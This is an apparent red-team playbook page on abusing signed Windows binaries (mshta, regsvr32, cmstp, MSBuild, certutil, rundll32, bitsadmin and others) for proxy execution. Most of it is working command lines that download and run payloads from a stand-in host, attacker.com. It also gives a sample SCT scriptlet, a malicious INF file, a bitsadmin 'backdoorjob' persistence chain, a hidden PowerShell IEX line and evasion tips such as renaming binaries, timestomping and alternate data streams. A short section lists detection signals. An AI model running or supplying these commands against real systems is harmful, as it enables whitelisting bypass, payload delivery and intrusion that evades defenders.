# Living Off the Land Binaries (LOLBAS)

> **MITRE ATT&CK**: Execution > T1218 - System Binary Proxy Execution
> **Platforms**: Windows
> **Required Privileges**: User (most techniques), Admin (some)
> **OPSEC Risk**: Low-Medium (signed Microsoft binaries executing attacker payloads)

---

## Strategic Overview

Living Off the Land Binaries, Scripts, and Libraries (LOLBAS) are legitimate, Microsoft-signed system binaries that can be abused for execution, download, lateral movement, or defense evasion. The strategic value is enormous: these binaries bypass application whitelisting (AppLocker, WDAC), avoid signature-based detection, and blend with normal system activity. As a Red Team Lead, you should maintain an operational knowledge of which LOLBAS are available on the target OS version and which are monitored by the deployed EDR. Some LOLBAS (certutil, mshta) are now heavily monitored, while others remain under the radar. Always verify against the target's defensive stack before deploying in an engagement.

## Technical Deep-Dive

### MSHTA (mshta.exe)

HTML Application host. Executes HTA files containing VBScript/JScript.

```bash
# Execute remote HTA payload
mshta.exe https://attacker.com/payload.hta

# Inline VBScript execution (no file needed)
mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd /c whoami > C:\temp\out.txt"", 0:close")

# Inline JScript execution
mshta.exe javascript:a=new%20ActiveXObject("WScript.Shell");a.Run("calc.exe");close();
```

### Regsvr32 (Squiblydoo Attack)

COM server registration utility. Can load remote SCT scriptlets.

```bash
# Remote scriptlet execution (bypasses AppLocker)
regsvr32 /s /n /u /i:https://attacker.com/payload.sct scrobj.dll

# Local SCT file
regsvr32 /s /n /u /i:C:\temp\payload.sct scrobj.dll
```

```xml
<!-- payload.sct -->
<?XML version="1.0"?>
<scriptlet>
  <registration progid="PoC" classid="{00000000-0000-0000-0000-000000000000}">
    <script language="JScript">
      <![CDATA[
        var r = new ActiveXObject("WScript.Shell");
        r.Run("cmd.exe /c calc.exe");
      ]]>
    </script>
  </registration>
</scriptlet>
```

### CMSTP (Connection Manager Profile Installer)

```bash
# Execute malicious INF file
cmstp.exe /ni /s C:\temp\malicious.inf
```

```ini
; malicious.inf
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection
[UnRegisterOCXSection]
%11%\scrobj.dll,NI,https://attacker.com/payload.sct
[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="EvilService"
ShortSvcName="EvilService"
```

### MSBuild (Microsoft Build Engine)

Executes C# or VB.NET code defined in project files without invoking csc.exe.

```bash
# Execute inline C# task
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\temp\payload.csproj

# Can also execute from UNC path
MSBuild.exe \\attacker\share\payload.csproj
```

See `03-execution/dotnet-execution.md` for MSBuild inline task XML examples.

### Certutil

Certificate utility with download and encoding capabilities.

```bash
# Download file from remote server
certutil.exe -urlcache -split -f https://attacker.com/payload.exe C:\temp\payload.exe

# Base64 encode a file (useful for data exfiltration)
certutil.exe -encode payload.exe payload.b64

# Base64 decode a file (reconstruct payload from encoded transfer)
certutil.exe -decode payload.b64 payload.exe

# Download and decode in sequence
certutil.exe -urlcache -split -f https://attacker.com/payload.b64 C:\temp\payload.b64
certutil.exe -decode C:\temp\payload.b64 C:\temp\payload.exe

# Clear URL cache (cleanup)
certutil.exe -urlcache -split -f https://attacker.com/payload.exe delete
```

### Rundll32

Loads and executes DLL exports, or can execute JavaScript.

```bash
# Execute DLL export function
rundll32.exe payload.dll,EntryPoint

# Execute DLL from UNC path
rundll32.exe \\attacker\share\payload.dll,Execute

# JavaScript execution via rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell");h.Run("calc.exe");

# Execute shell command via advpack
rundll32.exe advpack.dll,LaunchINFSection C:\temp\payload.inf,DefaultInstall_SingleUser,,1,
```

### InstallUtil

.NET installation utility that bypasses AppLocker.

```bash
# Execute via Uninstall method (bypasses default AppLocker rules)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\temp\payload.dll

# No output logging variant
InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
```

### Bitsadmin

Background Intelligent Transfer Service for file downloads.

```bash
# Download file
bitsadmin /transfer mydownload /download /priority high https://attacker.com/payload.exe C:\temp\payload.exe

# Create job with notification command (execute after download)
bitsadmin /create backdoorjob
bitsadmin /addfile backdoorjob https://attacker.com/payload.exe C:\temp\payload.exe
bitsadmin /SetNotifyCmdLine backdoorjob C:\temp\payload.exe NULL
bitsadmin /resume backdoorjob

# Alternative: PowerShell BitsTransfer
Start-BitsTransfer -Source "https://attacker.com/payload.exe" -Destination "C:\temp\payload.exe"
```

### Wscript / Cscript (Windows Script Host)

```bash
# Execute VBScript
wscript.exe C:\temp\payload.vbs
cscript.exe C:\temp\payload.vbs

# Execute JScript
wscript.exe C:\temp\payload.js
cscript.exe //E:jscript C:\temp\payload.js

# Execute from URL (wscript only)
wscript.exe https://attacker.com/payload.vbs
```

### Forfiles

```bash
# Execute command via forfiles (proxy execution)
forfiles /p C:\Windows /m notepad.exe /c "cmd /c calc.exe"

# Search and execute - obfuscated command execution
forfiles /p C:\Windows\System32 /m cmd.exe /c "cmd /c powershell.exe -nop -w hidden -c IEX(...)"
```

### Additional Notable LOLBAS

```bash
# Pcalua - Program Compatibility Assistant
pcalua.exe -a calc.exe
pcalua.exe -a C:\temp\payload.exe

# SyncAppvPublishingServer - Execute PowerShell via vbscript
SyncAppvPublishingServer.exe "n;Start-Process cmd.exe"

# Msiexec - Execute remote MSI
msiexec /q /i https://attacker.com/payload.msi

# Wmic (XSL processing)
wmic os get /format:"https://attacker.com/payload.xsl"
```

## Detection & Evasion

### Detection Mechanisms
- **Process command line logging**: Event ID 4688 / Sysmon Event ID 1
- **Network connections from unusual processes**: certutil, mshta making HTTP requests
- **AppLocker/WDAC logs**: Blocked or audited execution attempts
- **EDR behavioral rules**: Known LOLBAS patterns (e.g., certutil -urlcache, regsvr32 /i:http)

### Evasion Techniques
- Use lesser-known LOLBAS that are not in EDR signature databases
- Chain multiple LOLBAS (download with one, execute with another)
- Rename LOLBAS copies to avoid process name detection (copy certutil.exe to cert.exe)
- Use full paths to avoid command-line pattern matching
- Combine with timestomping to avoid timeline analysis
- Use alternate data streams to hide downloaded payloads

### OPSEC Considerations
- Certutil, mshta, and regsvr32 are now high-confidence detections in most EDR products
- MSBuild and InstallUtil are less monitored but still known
- Always test LOLBAS techniques against the specific EDR in the target environment
- Parent-child process relationships remain a strong detection vector
- Network connections from LOLBAS processes are almost always flagged

## Cross-References

- `03-execution/dotnet-execution.md` - MSBuild and InstallUtil deep-dive
- `03-execution/scripting-engines.md` - VBScript/JScript payload details
- `03-execution/wmi-execution.md` - WMIC XSL transformation
- `06-defense-evasion/` - Evasion techniques for LOLBAS detection

## References

- LOLBAS Project: https://lolbas-project.github.io/
- MITRE ATT&CK T1218: https://attack.mitre.org/techniques/T1218/
- LOLBAS detection rules: https://github.com/SigmaHQ/sigma
- UltimateAppLockerByPassList: https://github.com/api0cradle/UltimateAppLockerByPassList
